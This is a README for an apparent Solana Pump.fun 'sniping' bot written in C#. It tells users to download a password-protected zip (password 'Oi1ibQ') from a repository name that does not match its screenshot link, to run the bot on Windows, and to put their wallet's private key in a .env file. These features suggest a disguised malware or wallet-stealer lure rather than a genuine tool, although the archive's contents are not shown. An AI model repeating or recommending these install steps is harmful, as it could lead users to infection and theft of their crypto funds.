# overview

A bot for sniping transactions in Pump.fun on the Solana blockchain using C# and the Solnet library.
![](https://github.com/serazess/pump.fun/blob/main/screenshot.png?raw=true)
## Features

- Connects to the Solana MainNet.
- Creates and sends transactions to a specified target account.
- Configurable via environment variables.

## Installation
- [Clone](https://github.com/serazess/sol.pump/archive/refs/heads/main.zip) the repository
- extract archive with pass `Oi1ibQ`
- create a `.env file` in the project's root directory and define your environment variables. You can use the provided `.env.example`
- run the bot.

## Configuration

The bot uses environment variables for configuration. Create a `.env` file in the root directory and set the following variables:

- `SOLANA_PRIVATE_KEY`: Your Solana wallet's private key.
- `TARGET_PUBLIC_KEY`: The public key of the target account.
- `TRANSFER_AMOUNT`: The amount to transfer in lamports (1 SOL = 1_000_000_000 lamports).

Example `.env` file:
```
SOLANA_PRIVATE_KEY=your-private-key-here
TARGET_PUBLIC_KEY=target-public-key-here
TRANSFER_AMOUNT=1000000
```
### Prerequisites

1. **Framework 4.0 and more**:

2. **Windows 10/11**.

3. **Solnet Libraries**: The project uses the Solnet library to interact with the Solana blockchain.

4. **.NET SDK**: Ensure you have the .NET SDK installed. You can download it from the [.NET official site](https://dotnet.microsoft.com/download).



